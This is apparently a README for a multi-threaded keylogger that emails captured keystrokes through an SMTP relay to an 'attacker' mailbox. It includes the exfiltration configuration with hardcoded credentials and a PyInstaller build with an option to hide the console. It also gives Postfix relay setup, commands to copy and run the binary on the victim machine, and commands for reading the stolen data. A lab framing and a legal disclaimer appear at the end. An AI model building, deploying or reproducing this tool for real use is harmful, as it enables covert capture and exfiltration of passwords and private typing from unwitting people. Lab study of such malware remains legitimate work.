# SMTP Keystroke Monitor (Lab Edition)

A multi-threaded keystroke logger that uses SMTP to exfiltrate captured keystrokes via email. Designed for network security lab simulations with DMZ-based email relay infrastructure.

## 🏗️ Network Topology

```
┌──────────────┐       ┌──────────────┐       ┌──────────────┐
│  LAN         │       │     DMZ      │       │     WAN      │
│  Victim PC   │──────▶│  SMTP Relay  │──────▶│  Attacker    │
│ 192.168.x.x  │       │  172.16.0.5  │       │  Mail Server │
└──────────────┘       └──────────────┘       └──────────────┘
```

**Data Flow:**
1. Victim machine captures keystrokes (LAN)
2. Buffered keystrokes sent via SMTP to DMZ relay (172.16.0.5:587)
3. DMZ relay forwards emails to attacker's mailbox (WAN)

## ⚙️ SMTP Configuration

Before building, configure SMTP settings in `src/main.py`:

```python
SMTP_SERVER = "172.16.0.5"          # DMZ SMTP relay IP
SMTP_PORT = 587                     # STARTTLS port
SENDER_EMAIL = "attacker@dmz.local" # Sender address
SENDER_PASSWORD = "password123"     # SMTP credentials
RECEIVER_EMAIL = "attacker@dmz.local" # Recipient address
BUFFER_SIZE = 100                   # Max keystrokes per email
SEND_INTERVAL = 60                  # Seconds between sends
```

## 🛠️ Build Instructions

### Prerequisites
```bash
pip install pynput pyinstaller
```

### Generate Standalone Binary
```bash
# Clean build with all source paths
pyinstaller --onefile --clean --paths=src src/main.py

# Output: dist/main (or dist/main.exe on Windows)
```

### Build Options
- `--onefile`: Single executable bundle
- `--noconsole`: Hide console window (Windows)
- `--hidden-import`: Add imports if needed

## 🧪 Lab Simulation Steps

### 1. Setup DMZ SMTP Relay
```bash
# Install Postfix on DMZ machine (172.16.0.5)
sudo apt update && sudo apt install postfix

# Configure as relay with authentication
sudo dpkg-reconfigure postfix

# Create test user
sudo useradd -m attacker
echo "attacker:password123" | sudo chpasswd

# Enable STARTTLS on port 587
sudo postconf -e 'smtpd_tls_security_level=may'
sudo systemctl restart postfix
```

### 2. Deploy to Victim Machine
```bash
# Transfer binary to victim (LAN)
scp dist/main victim@192.168.x.x:/tmp/

# Execute on victim
./main
```

### 3. Monitor Attacker Mailbox
```bash
# Check mail on attacker's server
mail -u attacker

# Or monitor DMZ relay logs
sudo tail -f /var/log/mail.log
```

### 4. Graceful Shutdown
```bash
# Send SIGTERM for clean exit (flushes buffer)
kill -TERM <pid>

# Or SIGINT (Ctrl+C)
kill -INT <pid>
```

## 🔧 Architecture

### Multi-Threading Design
- **Queue Thread**: Captures keystrokes and adds to queue
- **Buffer Thread**: Dequeues keystrokes and builds email buffer
- **Sender Thread**: Periodically sends buffered data via SMTP

### Signal Handlers
- `SIGINT` / `SIGTERM`: Graceful shutdown with buffer flush
- Ensures no keystroke data is lost on exit

## ⚠️ Legal Disclaimer

This tool is designed **exclusively for authorized security testing and educational purposes** in controlled lab environments. Unauthorized keystroke logging is illegal. Use responsibly.
